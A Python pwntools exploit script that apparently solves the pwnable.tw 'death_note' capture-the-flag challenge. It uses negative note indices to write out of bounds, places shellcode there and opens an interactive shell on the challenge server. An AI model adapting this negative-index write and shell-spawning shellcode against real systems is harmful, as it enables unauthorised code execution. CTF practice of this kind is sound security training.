from pwn import *
import sys, time

def add_note(idx, content):
	print p.recv()
	p.send("1")
	print p.recv()
	p.send(str(idx))
	print p.recv()
	p.sendline(content)

def show_note(idx):
        print p.recv()
        p.sendline("2")
        print p.recv()
        p.sendline(str(idx))

def del_note(idx):
        print p.recv()
        p.sendline("3")
        print p.recv()
        p.sendline(str(idx))

target = "death_note"
binary = ELF(target)

if len(sys.argv) == 1:
	p = process(target)
else:
	p = remote("chall.pwnable.tw", 10201)

# https://nets.ec/Ascii_shellcode

for i in range(19456/88):
	print i
	add_note(0, "a"*79)

payload = "XBBB"
payload += "\x71\x27"
payload += "B"*0x20
add_note(-14, payload)

payload = asm(shellcraft.sh())
add_note(-19, payload)
p.interactive()
